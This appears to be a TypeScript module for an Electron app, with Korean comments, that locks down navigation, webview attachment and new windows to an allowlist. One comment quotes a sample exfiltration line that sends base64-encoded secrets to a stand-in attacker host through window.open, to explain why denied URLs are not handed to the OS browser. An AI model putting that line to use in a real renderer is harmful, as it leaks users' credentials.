export interface PreventableEvent {
  preventDefault(): void
}

/**
 * electron WebContents 중 이 모듈이 실제로 쓰는 부분만 좁혀 선언한다.
 * 오버로드를 정확히 적어 두면 호출부에 타입 캐스트가 필요 없다.
 */
export interface WebContentsLike {
  on(
    event: 'will-navigate',
    handler: (event: PreventableEvent, url: string) => void,
  ): void
  on(event: 'will-attach-webview', handler: (event: PreventableEvent) => void): void
  setWindowOpenHandler(handler: (details: { url: string }) => { action: 'deny' }): void
}

export interface WindowLike {
  webContents: WebContentsLike
}

export interface WindowPolicyOptions {
  /** renderer가 머물러도 되는 정확한 URL 목록 */
  readonly allowedUrls: readonly string[]
}

function normalize(url: string): string {
  try {
    const parsed = new URL(url)
    parsed.hash = ''
    parsed.search = ''
    return parsed.href
  } catch {
    return url
  }
}

/**
 * 창에 navigation·새 창·webview 정책을 건다.
 * 호출자가 electron 의존성을 주입하므로 이 모듈은 순수하게 테스트 가능하다.
 */
export function applyWindowPolicy(window: WindowLike, opts: WindowPolicyOptions): void {
  const allowed = new Set(opts.allowedUrls.map(normalize))

  window.webContents.on('will-navigate', (event, url) => {
    if (!allowed.has(normalize(url))) event.preventDefault()
  })

  window.webContents.on('will-attach-webview', (event) => {
    event.preventDefault()
  })

  // 새 창을 거부하는 데서 끝내고, URL을 OS 브라우저로 넘기지 않는다.
  //
  // renderer가 고른 URL을 shell.openExternal로 전달하면 그 자체가 유출 통로가
  // 된다: 침해된 renderer가 window.open('https://evil.com/?d=' + btoa(secrets))
  // 한 줄로 자격증명을 내보낼 수 있고, CSP는 이를 막지 못한다 — window.open을
  // 덮는 디렉티브가 없다(navigate-to는 표준화되지 않았다).
  //
  // 지금 이 앱에는 정당한 외부 링크가 하나도 없다. 실제로 필요해지면
  // 호스트 허용목록과 사용자 확인을 함께 붙여 의도적으로 열어야 한다.
  window.webContents.setWindowOpenHandler(() => ({ action: 'deny' }))
}
